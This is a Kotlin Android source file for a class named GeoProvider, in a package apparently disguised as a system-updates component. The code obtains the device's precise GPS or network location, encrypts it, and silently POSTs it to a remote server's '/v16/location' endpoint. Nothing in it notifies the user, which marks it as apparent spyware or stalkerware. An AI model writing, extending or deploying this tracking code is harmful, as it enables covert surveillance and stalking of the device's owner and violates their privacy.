package com.system.updates.modules.network

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.Build
import android.os.Looper
import android.util.Base64
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetworkUtils
import org.json.JSONObject

class GeoProvider(private val context: Context) {
    private val tag = "GeoProvider"
    private lateinit var crypto: CryptoManager
    private lateinit var network: NetworkUtils
    private var fusedClient: FusedLocationProviderClient? = null
    private var locationManager: LocationManager? = null

    init {
        try {
            crypto = CryptoManager(context)
            network = NetworkUtils(context)
            if (hasLocationPermission()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    fusedClient = LocationServices.getFusedLocationProviderClient(context)
                } else {
                    locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                }
            }
        } catch (e: Exception) {
            Log.e(tag, "Init error: ${e.message}")
        }
    }

    private fun hasLocationPermission(): Boolean {
        val fine = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
        val coarse = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION)
        return fine == PackageManager.PERMISSION_GRANTED || coarse == PackageManager.PERMISSION_GRANTED
    }

    fun getAndSendCurrentLocation() {
        if (!hasLocationPermission()) {
            Log.e(tag, "Missing location permission")
            return
        }
        if (fusedClient != null) {
            requestLocationFused()
        } else if (locationManager != null) {
            requestLocationLegacy()
        } else {
            Log.e(tag, "No location provider available")
        }
    }

    @SuppressLint("MissingPermission")
    private fun requestLocationFused() {
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 1000L)
            .setMaxUpdates(1)
            .build()
        val callback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                result.lastLocation?.let { processLocation(it) }
            }
        }
        try {
            fusedClient?.requestLocationUpdates(request, callback, Looper.getMainLooper())
        } catch (e: SecurityException) {
            Log.e(tag, "Fused security: ${e.message}")
        }
    }

    @SuppressLint("MissingPermission")
    private fun requestLocationLegacy() {
        val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
        for (provider in providers) {
            if (locationManager?.isProviderEnabled(provider) == true) {
                try {
                    locationManager?.requestSingleUpdate(provider, { location ->
                        processLocation(location)
                    }, Looper.getMainLooper())
                    return
                } catch (e: SecurityException) {
                    Log.e(tag, "Legacy security: ${e.message}")
                }
            }
        }
        Log.e(tag, "No provider enabled")
    }

    private fun processLocation(location: Location) {
        val lat = location.latitude
        val lon = location.longitude
        Log.d(tag, "Location: $lat, $lon")
        val json = JSONObject().apply {
            put("lat", lat)
            put("lon", lon)
            put("accuracy", location.accuracy)
            put("provider", location.provider)
            put("timestamp", System.currentTimeMillis())
        }
        val plain = json.toString()
        val key = crypto.deriveDeviceKey()
        val encrypted = crypto.encryptData(plain.toByteArray(), aad = "location".toByteArray())
        val b64 = Base64.encodeToString(encrypted, Base64.NO_WRAP)
        network.httpPost(network.getBaseUrl() + "/v16/location", "data=$b64")
    }
}